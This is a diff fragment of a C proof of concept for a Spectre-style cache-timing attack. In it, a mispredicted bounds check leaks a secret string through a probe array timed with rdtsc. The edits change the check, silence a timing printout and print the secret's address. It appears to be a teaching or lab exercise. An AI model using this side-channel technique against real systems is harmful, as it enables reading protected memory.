@@ -9,10 +9,10 @@ char *secret = "Hello!";
 uint8_t B[256*64]; //side-channel (SC)
 uint8_t results[256];
 void victim(size_t addr){
-if (((float)addr / 1.0) < 10.0){ //safety check - mispredicts
+if ( ((float)addr*1.0) < 10.0 && (int)addr >= 0 ){ //safety check - mispredicts
     uint8_t val = A[addr]; //accesses secret
     uint8_t x = B[val*64]; //transmits secret to SC
-}
+} 
 }
 
 char attack(void* attack_addr){
@@ -34,7 +34,7 @@ char attack(void* attack_addr){
             uint8_t temp = B[guess*64]; //accessing the guess t2= rdtscp(); //read timer
             uint64_t t2 = _rdtsc(); //read timer
             uint64_t diff = t2-t1;
-            printf("Time difference for %d: %lu \n",guess,diff);
+            //printf("Time difference for %d: %lu \n",guess,diff);
         if (t2-t1 <= CACHE_HIT_THRESHOLD){
             results[guess] += 1; //potential secret
         }
@@ -56,6 +56,7 @@ char res;
 int main(int argc, char* argv[]) {
     printf("Hello World!\n");
     printf("%p \n",A);
+    printf("%p \n",secret);
     char data_found = attack(secret);
    printf("Seceret Found: %c \n", data_found);
    printf("%p \n", &B[4608]);
